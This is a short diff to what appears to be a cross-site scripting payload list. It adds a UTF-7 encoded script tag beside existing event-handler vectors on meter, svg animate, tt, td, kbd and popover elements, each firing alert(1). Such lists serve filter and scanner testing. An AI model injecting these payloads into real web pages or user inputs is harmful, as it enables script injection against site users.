@@ -5,6 +5,7 @@
 <meter onclick="alert(1)" style=display:block>test</meter>
 <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
 <tt onmouseenter="alert(1)" style=display:block>test</tt>
++ADw-script+AD4-alert(1)+ADw-+AC8-script+AD4-
 <td onkeypress="alert(1)" contenteditable style=display:block>test</td>
 <kbd onpointerleave=alert(1) style=display:block>XSS</kbd>
 <button popovertarget=x>Click me</button><xmp onbeforetoggle=alert(1) popover id=x>XSS</xmp>
